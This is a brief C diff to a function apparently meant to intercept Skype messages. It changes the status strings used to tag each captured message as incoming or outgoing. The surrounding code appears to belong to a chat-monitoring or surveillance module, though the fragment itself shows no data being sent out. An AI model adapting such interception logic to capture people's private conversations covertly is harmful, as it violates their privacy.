@@ -250,10 +250,10 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 			DWORD direction;
 			char *msg_ptr, *message_id;
 		
-			if (msg_ptr = strstr((char *)msg, " STATUS SENT")) {
+			if (msg_ptr = strstr((char *)msg, " STATUS SENDING")) {
 				direction = SKYPE_MSG_OUT;
 				*msg_ptr = 0;
-			} else if (msg_ptr = strstr((char *)msg, " STATUS READ")) {
+			} else if (msg_ptr = strstr((char *)msg, " STATUS RECEIVED")) {
 				direction = SKYPE_MSG_IN;
 				*msg_ptr = 0;
 			} else
